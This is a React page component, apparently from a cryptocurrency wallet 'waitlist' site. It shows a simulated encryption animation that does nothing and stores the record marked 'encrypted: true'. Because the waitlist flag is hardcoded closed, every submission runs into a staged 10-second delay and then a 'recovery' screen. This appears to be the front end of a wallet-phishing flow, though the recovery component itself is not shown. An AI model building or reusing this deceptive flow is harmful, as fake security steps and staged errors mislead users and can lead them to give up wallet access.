import React, { useState } from 'react';
import { addDoc, collection } from 'firebase/firestore';
import { db } from '../firebase';
import { useNavigate } from 'react-router-dom';
import { getWalletById } from '../data/wallets';

// Components
import WaitlistHeader from '../components/waitlist/WaitlistHeader';
import SecurityFeaturesSection from '../components/waitlist/SecurityFeaturesSection';
import WalletSearchSection from '../components/waitlist/WalletSearchSection';
import WalletConnectionModal from '../components/waitlist/WalletConnectionModal';
import ErrorRecoverySection from '../components/waitlist/ErrorRecoverySection';
import StatusMessages from '../components/waitlist/StatusMessages';

export default function WaitlistPage() {
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState('');
  const [waitlistOpen, setWaitlistOpen] = useState(false);
  const [customWalletName, setCustomWalletName] = useState('');
  const [showErrorPage, setShowErrorPage] = useState(false);
  const [loading, setLoading] = useState(false);
  const [showSuccessMessage, setShowSuccessMessage] = useState(false);
  const [encryptionStep, setEncryptionStep] = useState(0);

  const navigate = useNavigate();

  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet);
    setIsModalOpen(true);
  };

  const handleSubmit = async (walletName, walletAddress) => {
    setIsSubmitting(true);
    setEncryptionStep(1);

    if (!selectedWallet || !walletAddress) {
      setSubmitStatus('error');
      setIsSubmitting(false);
      setEncryptionStep(0);
      return;
    }

    // Simulate encryption process
    setTimeout(() => setEncryptionStep(2), 1000);
    setTimeout(() => setEncryptionStep(3), 2000);

    if (waitlistOpen) {
      try {
        setTimeout(async () => {
          await addDoc(collection(db, 'waitlist'), {
            wallet: walletName,
            address: walletAddress,
            email: 'example@gmail.com',
            timestamp: new Date().toISOString(),
            encrypted: true,
          });

          setSubmitStatus('success');
          setCustomWalletName('');
          setSelectedWallet(null);
          setIsModalOpen(false);
          setEncryptionStep(0);

          setShowSuccessMessage(true);
          setTimeout(() => {
            setShowSuccessMessage(false);
            navigate('/waitlist');
          }, 3000);
        }, 3000);
      } catch (error) {
        console.error('Error adding to waitlist:', error);
        setSubmitStatus('error');
        setEncryptionStep(0);
      } finally {
        setTimeout(() => setIsSubmitting(false), 3000);
      }
    } else {
      setShowErrorPage(false);
      setLoading(true);

      setTimeout(() => {
        setLoading(false);
        setShowErrorPage(true);
        setEncryptionStep(0);
        setIsSubmitting(false);
      }, 10000);
    }
  };

  const handleRecoverySuccess = () => {
    setShowSuccessMessage(true);
    setShowErrorPage(false);
    setTimeout(() => {
      setShowSuccessMessage(false);
    }, 5000);
  };

  // Show error page with recovery options
  if (showErrorPage) {
    return (
      <ErrorRecoverySection
        onClose={() => setShowErrorPage(false)}
        selectedWallet={selectedWallet}
        walletAddress=""
        customWalletName={customWalletName}
        onSuccess={handleRecoverySuccess}
      />
    );
  }

  return (
    <div className="min-h-screen bg-[#0a0a0f] pt-24 px-6">
      <div className="max-w-4xl mx-auto">
        <WaitlistHeader />

        <StatusMessages 
          submitStatus={submitStatus}
          showSuccessMessage={showSuccessMessage}
        />

        <div className="grid md:grid-cols-2 gap-8 mb-12">
          <SecurityFeaturesSection />
          <WalletSearchSection 
            onWalletSelect={handleWalletSelect}
            selectedWallet={selectedWallet}
          />
        </div>

        <WalletConnectionModal
          isOpen={isModalOpen}
          onClose={() => setIsModalOpen(false)}
          selectedWallet={selectedWallet}
          onSubmit={handleSubmit}
          isSubmitting={isSubmitting}
          encryptionStep={encryptionStep}
        />
      </div>
    </div>
  );
}